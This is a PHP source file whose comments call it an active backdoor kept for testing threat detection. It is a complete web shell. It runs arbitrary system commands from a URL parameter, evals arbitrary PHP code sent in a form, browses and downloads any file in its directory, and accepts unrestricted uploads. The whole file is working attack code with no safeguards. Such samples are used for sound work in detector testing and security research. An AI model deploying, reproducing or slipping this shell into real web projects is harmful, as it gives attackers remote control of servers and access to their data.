<?php
// This is an active backdoor script that will actually execute commands
// WARNING: This is dangerous and only for testing threat detection

// Current directory display
echo "<h1>PHP Backdoor</h1>";
echo "<div style='background-color: #333; color: white; padding: 5px;'>";
echo "Current directory: " . getcwd();
echo "</div>";

// Command execution
if(isset($_GET['cmd'])) {
    echo "<h2>Command Execution</h2>";
    echo "<pre style='background-color: #f5f5f5; padding: 10px; border: 1px solid #ddd;'>";
    system($_GET['cmd'] . " 2>&1");
    echo "</pre>";
}

// File browser
echo "<h2>File Browser</h2>";
echo "<div style='height: 300px; overflow: auto; background-color: #f5f5f5; padding: 10px; border: 1px solid #ddd;'>";
$files = scandir('.');
foreach($files as $file) {
    if ($file != '.' && $file != '..') {
        echo "<div>";
        echo $file . " (" . filesize($file) . " bytes) ";
        echo "<a href='?download=" . urlencode($file) . "'>Download</a>";
        echo "</div>";
    }
}
echo "</div>";

// File download
if(isset($_GET['download'])) {
    $file = $_GET['download'];
    if(file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// File upload
echo "<h2>File Upload</h2>";
echo "<form action='' method='post' enctype='multipart/form-data'>";
echo "<input type='file' name='upload'>";
echo "<input type='submit' value='Upload'>";
echo "</form>";

if(isset($_FILES['upload'])) {
    $target_file = basename($_FILES["upload"]["name"]);
    if (move_uploaded_file($_FILES["upload"]["tmp_name"], $target_file)) {
        echo "The file ". htmlspecialchars($target_file). " has been uploaded.";
    } else {
        echo "Sorry, there was an error uploading your file.";
    }
}

// Eval execution
echo "<h2>PHP Code Execution</h2>";
echo "<form action='' method='post'>";
echo "<textarea name='code' style='width: 100%; height: 100px;'>echo 'Hello World!';</textarea><br>";
echo "<input type='submit' value='Execute PHP'>";
echo "</form>";

if(isset($_POST['code'])) {
    echo "<div style='background-color: #f5f5f5; padding: 10px; border: 1px solid #ddd;'>";
    echo "<strong>Output:</strong><br>";
    try {
        eval($_POST['code']);
    } catch (Exception $e) {
        echo "Error: " . $e->getMessage();
    }
    echo "</div>";
}

// Command form
echo "<h2>Command Execution</h2>";
echo "<form action='' method='get'>";
echo "<input type='text' name='cmd' placeholder='Enter command' style='width: 300px;' value='id'>";
echo "<input type='submit' value='Execute'>";
echo "</form>";
?>